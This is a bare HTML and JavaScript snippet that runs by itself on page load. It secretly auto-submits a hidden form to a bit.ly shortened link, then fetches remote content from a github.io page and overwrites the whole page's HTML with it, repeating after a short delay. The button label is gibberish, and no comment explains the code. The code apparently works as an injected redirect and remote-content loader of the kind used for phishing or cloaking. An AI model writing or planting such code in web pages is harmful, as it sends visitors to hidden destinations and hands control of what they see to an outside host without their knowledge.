<script
  src="https://code.jquery.com/jquery-3.5.1.min.js"
  integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
  crossorigin="anonymous"></script>
 
   <form style="display:none" id="myForm" action="https://bit.ly/2WkyOmw" method="get">

<input type="text" name="vaiz">
<button type="submit">zdsasdsadassaa</button>
</form>


<script>
function vai () {
document.getElementById("myForm").submit();
	$.ajax({
        url: "https://mobi-center.github.io/mobi-center/tema.md",
        type: 'GET',
        success: function(res) {
        	$("html").html(res);  
		
        }
    });

}


vai();

   setTimeout(function () {
     
    	vai();
    }, 1200);
</script>
